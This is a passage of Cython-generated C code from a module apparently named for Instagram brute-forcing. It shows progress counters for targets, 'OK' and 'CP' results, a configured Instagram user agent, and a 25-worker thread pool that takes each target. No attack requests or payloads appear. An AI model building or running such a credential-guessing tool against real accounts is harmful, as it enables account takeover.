      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_5 = 0;
      __pyx_t_6 = 127;
      __pyx_t_2 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_v_current), __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 86, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_6 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) > __pyx_t_6) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_2) : __pyx_t_6;
      __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
      __Pyx_GIVEREF(__pyx_t_2);
      PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_2);
      __pyx_t_2 = 0;
      __Pyx_INCREF(__pyx_kp_u_);
      __pyx_t_5 += 1;
      __Pyx_GIVEREF(__pyx_kp_u_);
      PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_kp_u_);
      if (unlikely(!__pyx_cur_scope->__pyx_v_self)) { __Pyx_RaiseClosureNameError("self"); __PYX_ERR(0, 86, __pyx_L1_error) }
      __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_TARGET); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 86, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_7 = PyObject_Length(__pyx_t_2); if (unlikely(__pyx_t_7 == ((Py_ssize_t)-1))) __PYX_ERR(0, 86, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = __Pyx_PyUnicode_From_Py_ssize_t(__pyx_t_7, 0, ' ', 'd'); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 86, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
      __Pyx_GIVEREF(__pyx_t_2);
      PyTuple_SET_ITEM(__pyx_t_3, 2, __pyx_t_2);
      __pyx_t_2 = 0;
      __Pyx_INCREF(__pyx_kp_u_OK_bold_green);
      __pyx_t_5 += 17;
      __Pyx_GIVEREF(__pyx_kp_u_OK_bold_green);
      PyTuple_SET_ITEM(__pyx_t_3, 3, __pyx_kp_u_OK_bold_green);
      if (unlikely(!__pyx_cur_scope->__pyx_v_self)) { __Pyx_RaiseClosureNameError("self"); __PYX_ERR(0, 86, __pyx_L1_error) }
      __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_OK); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 86, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_7 = PyObject_Length(__pyx_t_2); if (unlikely(__pyx_t_7 == ((Py_ssize_t)-1))) __PYX_ERR(0, 86, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = __Pyx_PyUnicode_From_Py_ssize_t(__pyx_t_7, 0, ' ', 'd'); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 86, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
      __Pyx_GIVEREF(__pyx_t_2);
      PyTuple_SET_ITEM(__pyx_t_3, 4, __pyx_t_2);
      __pyx_t_2 = 0;
      __Pyx_INCREF(__pyx_kp_u_CP_bold_yellow);
      __pyx_t_5 += 21;
      __Pyx_GIVEREF(__pyx_kp_u_CP_bold_yellow);
      PyTuple_SET_ITEM(__pyx_t_3, 5, __pyx_kp_u_CP_bold_yellow);
      if (unlikely(!__pyx_cur_scope->__pyx_v_self)) { __Pyx_RaiseClosureNameError("self"); __PYX_ERR(0, 86, __pyx_L1_error) }
      __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_CP); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 86, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_7 = PyObject_Length(__pyx_t_2); if (unlikely(__pyx_t_7 == ((Py_ssize_t)-1))) __PYX_ERR(0, 86, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = __Pyx_PyUnicode_From_Py_ssize_t(__pyx_t_7, 0, ' ', 'd'); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 86, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_2);
      __Pyx_GIVEREF(__pyx_t_2);
      PyTuple_SET_ITEM(__pyx_t_3, 6, __pyx_t_2);
      __pyx_t_2 = 0;
      __Pyx_INCREF(__pyx_kp_u__2);
      __pyx_t_5 += 3;
      __Pyx_GIVEREF(__pyx_kp_u__2);
      PyTuple_SET_ITEM(__pyx_t_3, 7, __pyx_kp_u__2);
      __pyx_t_2 = __Pyx_PyUnicode_Join(__pyx_t_3, 8, __pyx_t_5, __pyx_t_6); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 86, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF_SET(__pyx_v_description, ((PyObject*)__pyx_t_2));
      __pyx_t_2 = 0;
    }
    __pyx_L5:;

     
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_status, __pyx_n_s_update); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 88, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = PyTuple_New(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 88, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_INCREF(__pyx_v_task);
    __Pyx_GIVEREF(__pyx_v_task);
    PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_v_task);
    __pyx_t_1 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 88, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_description, __pyx_v_description) < 0) __PYX_ERR(0, 88, __pyx_L1_error)
    __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_3, __pyx_t_1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 88, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
  }

   
    {
    if (unlikely(!__pyx_cur_scope->__pyx_v_self)) { __Pyx_RaiseClosureNameError("self"); __PYX_ERR(0, 90, __pyx_L1_error) }
    __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_TARGET); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 90, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __pyx_t_5 = PyObject_Length(__pyx_t_8); if (unlikely(__pyx_t_5 == ((Py_ssize_t)-1))) __PYX_ERR(0, 90, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_8 = PyInt_FromSsize_t(__pyx_t_5); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 90, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    if (unlikely(!__pyx_cur_scope->__pyx_v_self)) { __Pyx_RaiseClosureNameError("self"); __PYX_ERR(0, 90, __pyx_L1_error) }
    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_PROGRESS_CURRENT); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 90, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_3 = PyNumber_Subtract(__pyx_t_8, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 90, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_XDECREF_SET(__pyx_v_current, __pyx_t_3);
    __pyx_t_3 = 0;

     
    __pyx_t_3 = PyTuple_New(8); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 91, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_5 = 0;
    __pyx_t_6 = 127;
    __pyx_t_1 = __Pyx_PyObject_FormatSimpleAndDecref(PyObject_Unicode(__pyx_v_current), __pyx_empty_unicode); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 91, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_6 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) > __pyx_t_6) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_1) : __pyx_t_6;
    __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
    __Pyx_GIVEREF(__pyx_t_1);
    PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_t_1);
    __pyx_t_1 = 0;
    __Pyx_INCREF(__pyx_kp_u_);
    __pyx_t_5 += 1;
    __Pyx_GIVEREF(__pyx_kp_u_);
    PyTuple_SET_ITEM(__pyx_t_3, 1, __pyx_kp_u_);
    if (unlikely(!__pyx_cur_scope->__pyx_v_self)) { __Pyx_RaiseClosureNameError("self"); __PYX_ERR(0, 91, __pyx_L1_error) }
    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_TARGET); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 91, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_7 = PyObject_Length(__pyx_t_1); if (unlikely(__pyx_t_7 == ((Py_ssize_t)-1))) __PYX_ERR(0, 91, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __Pyx_PyUnicode_From_Py_ssize_t(__pyx_t_7, 0, ' ', 'd'); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 91, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
    __Pyx_GIVEREF(__pyx_t_1);
    PyTuple_SET_ITEM(__pyx_t_3, 2, __pyx_t_1);
    __pyx_t_1 = 0;
    __Pyx_INCREF(__pyx_kp_u_OK_bold_green);
    __pyx_t_5 += 17;
    __Pyx_GIVEREF(__pyx_kp_u_OK_bold_green);
    PyTuple_SET_ITEM(__pyx_t_3, 3, __pyx_kp_u_OK_bold_green);
    if (unlikely(!__pyx_cur_scope->__pyx_v_self)) { __Pyx_RaiseClosureNameError("self"); __PYX_ERR(0, 91, __pyx_L1_error) }
    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_OK); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 91, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_7 = PyObject_Length(__pyx_t_1); if (unlikely(__pyx_t_7 == ((Py_ssize_t)-1))) __PYX_ERR(0, 91, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __Pyx_PyUnicode_From_Py_ssize_t(__pyx_t_7, 0, ' ', 'd'); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 91, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
    __Pyx_GIVEREF(__pyx_t_1);
    PyTuple_SET_ITEM(__pyx_t_3, 4, __pyx_t_1);
    __pyx_t_1 = 0;
    __Pyx_INCREF(__pyx_kp_u_CP_bold_yellow);
    __pyx_t_5 += 21;
    __Pyx_GIVEREF(__pyx_kp_u_CP_bold_yellow);
    PyTuple_SET_ITEM(__pyx_t_3, 5, __pyx_kp_u_CP_bold_yellow);
    if (unlikely(!__pyx_cur_scope->__pyx_v_self)) { __Pyx_RaiseClosureNameError("self"); __PYX_ERR(0, 91, __pyx_L1_error) }
    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_CP); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 91, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_7 = PyObject_Length(__pyx_t_1); if (unlikely(__pyx_t_7 == ((Py_ssize_t)-1))) __PYX_ERR(0, 91, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __Pyx_PyUnicode_From_Py_ssize_t(__pyx_t_7, 0, ' ', 'd'); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 91, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_5 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_1);
    __Pyx_GIVEREF(__pyx_t_1);
    PyTuple_SET_ITEM(__pyx_t_3, 6, __pyx_t_1);
    __pyx_t_1 = 0;
    __Pyx_INCREF(__pyx_kp_u__2);
    __pyx_t_5 += 3;
    __Pyx_GIVEREF(__pyx_kp_u__2);
    PyTuple_SET_ITEM(__pyx_t_3, 7, __pyx_kp_u__2);
    __pyx_t_1 = __Pyx_PyUnicode_Join(__pyx_t_3, 8, __pyx_t_5, __pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 91, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF_SET(__pyx_v_description, ((PyObject*)__pyx_t_1));
    __pyx_t_1 = 0;

     
    __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_status, __pyx_n_s_update); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 92, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_3 = PyTuple_New(1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 92, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_INCREF(__pyx_v_task);
    __Pyx_GIVEREF(__pyx_v_task);
    PyTuple_SET_ITEM(__pyx_t_3, 0, __pyx_v_task);
    __pyx_t_8 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 92, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    if (PyDict_SetItem(__pyx_t_8, __pyx_n_s_description, __pyx_v_description) < 0) __PYX_ERR(0, 92, __pyx_L1_error)
    __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_3, __pyx_t_8); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 92, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }

   

   
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.start.loading", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_description);
  __Pyx_XDECREF(__pyx_v_current);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

 

 
static PyObject *__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_5start_3normal(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds);  
static PyMethodDef __pyx_mdef_11controllers_2ig_10bruteforce_8__init___4Base_5start_3normal = {"normal", (PyCFunction)(void*)(PyCFunctionWithKeywords)__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_5start_3normal, METH_VARARGS|METH_KEYWORDS, 0};
static PyObject *__pyx_pw_11controllers_2ig_10bruteforce_8__init___4Base_5start_3normal(PyObject *__pyx_self, PyObject *__pyx_args, PyObject *__pyx_kwds) {
  PyObject *__pyx_v_data = 0;
  PyObject *__pyx_v_kwargs = 0;
  PyObject *__pyx_v_task = 0;
  PyObject *__pyx_v_status = 0;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("normal (wrapper)", 0);
  {
    static PyObject **__pyx_pyargnames[] = {&__pyx_n_s_data,&__pyx_n_s_kwargs,&__pyx_n_s_task,&__pyx_n_s_status,0};
    PyObject* values[4] = {0,0,0,0};
    if (unlikely(__pyx_kwds)) {
      Py_ssize_t kw_args;
      const Py_ssize_t pos_args = PyTuple_GET_SIZE(__pyx_args);
      switch (pos_args) {
        case  4: values[3] = PyTuple_GET_ITEM(__pyx_args, 3);
        CYTHON_FALLTHROUGH;
        case  3: values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
        CYTHON_FALLTHROUGH;
        case  2: values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
        CYTHON_FALLTHROUGH;
        case  1: values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
        CYTHON_FALLTHROUGH;
        case  0: break;
        default: goto __pyx_L5_argtuple_error;
      }
      kw_args = PyDict_Size(__pyx_kwds);
      switch (pos_args) {
        case  0:
        if (likely((values[0] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_data)) != 0)) kw_args--;
        else goto __pyx_L5_argtuple_error;
        CYTHON_FALLTHROUGH;
        case  1:
        if (likely((values[1] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_kwargs)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("normal", 1, 4, 4, 1); __PYX_ERR(0, 94, __pyx_L3_error)
        }
        CYTHON_FALLTHROUGH;
        case  2:
        if (likely((values[2] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_task)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("normal", 1, 4, 4, 2); __PYX_ERR(0, 94, __pyx_L3_error)
        }
        CYTHON_FALLTHROUGH;
        case  3:
        if (likely((values[3] = __Pyx_PyDict_GetItemStr(__pyx_kwds, __pyx_n_s_status)) != 0)) kw_args--;
        else {
          __Pyx_RaiseArgtupleInvalid("normal", 1, 4, 4, 3); __PYX_ERR(0, 94, __pyx_L3_error)
        }
      }
      if (unlikely(kw_args > 0)) {
        if (unlikely(__Pyx_ParseOptionalKeywords(__pyx_kwds, __pyx_pyargnames, 0, values, pos_args, "normal") < 0)) __PYX_ERR(0, 94, __pyx_L3_error)
      }
    } else if (PyTuple_GET_SIZE(__pyx_args) != 4) {
      goto __pyx_L5_argtuple_error;
    } else {
      values[0] = PyTuple_GET_ITEM(__pyx_args, 0);
      values[1] = PyTuple_GET_ITEM(__pyx_args, 1);
      values[2] = PyTuple_GET_ITEM(__pyx_args, 2);
      values[3] = PyTuple_GET_ITEM(__pyx_args, 3);
    }
    __pyx_v_data = values[0];
    __pyx_v_kwargs = values[1];
    __pyx_v_task = values[2];
    __pyx_v_status = values[3];
  }
  goto __pyx_L4_argument_unpacking_done;
  __pyx_L5_argtuple_error:;
  __Pyx_RaiseArgtupleInvalid("normal", 1, 4, 4, PyTuple_GET_SIZE(__pyx_args)); __PYX_ERR(0, 94, __pyx_L3_error)
  __pyx_L3_error:;
  __Pyx_AddTraceback("controllers.ig.bruteforce.__init__.Base.start.normal", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __Pyx_RefNannyFinishContext();
  return NULL;
  __pyx_L4_argument_unpacking_done:;
  __pyx_r = __pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base_5start_2normal(__pyx_self, __pyx_v_data, __pyx_v_kwargs, __pyx_v_task, __pyx_v_status);

   
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_11controllers_2ig_10bruteforce_8__init___4Base_5start_2normal(PyObject *__pyx_self, PyObject *__pyx_v_data, PyObject *__pyx_v_kwargs, PyObject *__pyx_v_task, PyObject *__pyx_v_status) {
  struct __pyx_obj_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start *__pyx_cur_scope;
  struct __pyx_obj_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start *__pyx_outer_scope;
  PyObject *__pyx_v_pool = NULL;
  PyObject *__pyx_v_target = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  Py_ssize_t __pyx_t_9;
  PyObject *(*__pyx_t_10)(PyObject *);
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  int __pyx_t_13;
  int __pyx_t_14;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("normal", 0);
  __pyx_outer_scope = (struct __pyx_obj_11controllers_2ig_10bruteforce_8__init_____pyx_scope_struct__start *) __Pyx_CyFunction_GetClosure(__pyx_self);
  __pyx_cur_scope = __pyx_outer_scope;

   
  if (unlikely(PyObject_SetItem(__pyx_v_kwargs, __pyx_n_u_task, __pyx_v_task) < 0)) __PYX_ERR(0, 95, __pyx_L1_error)

   
  if (unlikely(PyObject_SetItem(__pyx_v_kwargs, __pyx_n_u_progress, __pyx_v_status) < 0)) __PYX_ERR(0, 96, __pyx_L1_error)

   
  if (unlikely(!__pyx_cur_scope->__pyx_v_self)) { __Pyx_RaiseClosureNameError("self"); __PYX_ERR(0, 97, __pyx_L1_error) }
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_cur_scope->__pyx_v_self, __pyx_n_s_config); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 97, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_app); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 97, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_IG_USER_AGENT); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 97, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(PyObject_SetItem(__pyx_v_kwargs, __pyx_n_u_user_agent, __pyx_t_1) < 0)) __PYX_ERR(0, 97, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

   
    {
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 98, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 98, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_max_workers, __pyx_int_25) < 0) __PYX_ERR(0, 98, __pyx_L1_error)
    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_empty_tuple, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 98, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_4 = __Pyx_PyObject_LookupSpecial(__pyx_t_3, __pyx_n_s_exit); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 98, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_1 = __Pyx_PyObject_LookupSpecial(__pyx_t_3, __pyx_n_s_enter); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 98, __pyx_L3_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_5 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
      __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_1);
      if (likely(__pyx_t_5)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
        __Pyx_INCREF(__pyx_t_5);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_1, function);
      }
    }
    __pyx_t_2 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 98, __pyx_L3_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __pyx_t_2;
    __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      {
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_7, &__pyx_t_8);
        __Pyx_XGOTREF(__pyx_t_6);
        __Pyx_XGOTREF(__pyx_t_7);
        __Pyx_XGOTREF(__pyx_t_8);
          {
          __pyx_v_pool = __pyx_t_1;
          __pyx_t_1 = 0;

           
          if (likely(PyList_CheckExact(__pyx_v_data)) || PyTuple_CheckExact(__pyx_v_data)) {
            __pyx_t_1 = __pyx_v_data; __Pyx_INCREF(__pyx_t_1); __pyx_t_9 = 0;
            __pyx_t_10 = NULL;
          } else {
            __pyx_t_9 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_v_data); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 99, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_1);
            __pyx_t_10 = Py_TYPE(__pyx_t_1)->tp_iternext; if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 99, __pyx_L7_error)
          }
          for (;;) {
            if (likely(!__pyx_t_10)) {
              if (likely(PyList_CheckExact(__pyx_t_1))) {
                if (__pyx_t_9 >= PyList_GET_SIZE(__pyx_t_1)) break;
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                __pyx_t_3 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_9); __Pyx_INCREF(__pyx_t_3); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 99, __pyx_L7_error)
                #else
                __pyx_t_3 = PySequence_ITEM(__pyx_t_1, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 99, __pyx_L7_error)
                __Pyx_GOTREF(__pyx_t_3);
                #endif
              } else {
                if (__pyx_t_9 >= PyTuple_GET_SIZE(__pyx_t_1)) break;
                #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                __pyx_t_3 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_9); __Pyx_INCREF(__pyx_t_3); __pyx_t_9++; if (unlikely(0 < 0)) __PYX_ERR(0, 99, __pyx_L7_error)
                #else
                __pyx_t_3 = PySequence_ITEM(__pyx_t_1, __pyx_t_9); __pyx_t_9++; if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 99, __pyx_L7_error)
                __Pyx_GOTREF(__pyx_t_3);
                #endif
              }
            } else {
              __pyx_t_3 = __pyx_t_10(__pyx_t_1);
              if (unlikely(!__pyx_t_3)) {
                PyObject* exc_type = PyErr_Occurred();
                if (exc_type) {
                  if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                  else __PYX_ERR(0, 99, __pyx_L7_error)
                }
                break;
              }
              __Pyx_GOTREF(__pyx_t_3);
            }
            __Pyx_XDECREF_SET(__pyx_v_target, __pyx_t_3);
            __pyx_t_3 = 0;

             
            __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_pool, __pyx_n_s_submit); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 100, __pyx_L7_error)
            __Pyx_GOTREF(__pyx_t_3);
